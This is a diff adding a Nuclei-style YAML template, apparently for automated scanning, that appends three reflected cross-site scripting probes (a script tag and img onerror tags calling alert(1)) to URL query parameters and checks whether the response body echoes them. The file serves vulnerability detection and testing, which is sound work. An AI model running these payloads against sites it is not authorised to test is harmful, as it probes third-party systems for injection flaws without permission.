@@ -1,0 +1,32 @@
+id: Xssor-Finder
+
+info:
+  name: R-Xss Finder
+  author: SirBugs
+  severity: medium
+  description: This template is a copy and better than version of "https://github.com/SirBugs/Xssor.go"
+  tags: xssor, xss, rxss
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    payloads:
+      reflection:
+        - 'a"><script>alert(1)</script>'
+        - 'a"><img src=x onerror=alert(1)>'
+        - 'a"><img+src=x+onerror=alert(1)>'
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+    matchers:
+      - type: word
+        part: body
+        condition: or
+        words:
+          - '<script>alert(1)</script>'
+          - '<img src=x onerror=alert(1)>'
+          - '<img+src=x+onerror=alert(1)>'
